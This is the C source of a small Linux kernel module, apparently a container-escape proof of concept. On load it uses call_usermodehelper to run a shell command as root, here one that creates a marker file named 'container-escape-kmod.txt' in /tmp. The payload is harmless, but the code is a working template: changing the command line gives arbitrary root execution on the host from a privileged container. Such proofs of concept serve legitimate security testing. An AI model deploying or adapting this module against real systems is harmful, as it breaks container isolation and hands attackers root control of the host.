#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/init.h>

static int __init hello_start(void)
{
int rc;
static char *envp[] = {
    "SHELL=/bin/sh",
    "HOME=/tmp",
    "USER=root",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "DISPLAY=:0",
    "PWD=/tmp", 
    NULL};
char *argv[] = {"/bin/sh", "-c", "touch /tmp/container-escape-kmod.txt", NULL};

printk(KERN_INFO "Loading TEST module...\n");

rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
printk("RC is: %i \n", rc);

return 0;
}

static void __exit hello_end(void)
{
printk(KERN_INFO "Unloading TEST\n");
}

MODULE_LICENSE("GPL");
module_init(hello_start);
module_exit(hello_end);
